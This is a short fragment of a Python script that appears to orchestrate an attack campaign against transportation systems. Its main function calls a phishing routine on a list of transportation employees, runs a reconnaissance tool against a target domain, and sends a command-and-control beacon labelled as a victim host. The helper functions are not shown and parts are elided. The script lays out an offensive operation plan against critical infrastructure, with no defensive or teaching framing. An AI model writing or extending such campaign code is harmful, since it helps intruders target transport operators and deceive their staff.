...
def main():
    """
    Main function to run the transportation_system_campaign campaign.
    """
    print(f"[*] Starting transportation_system_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("transportation_systems_employees.txt")
    run_tool("apt_web_recon.js", "--target transportation_systems.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-TRANSPORTATION_SYSTEMS-01")
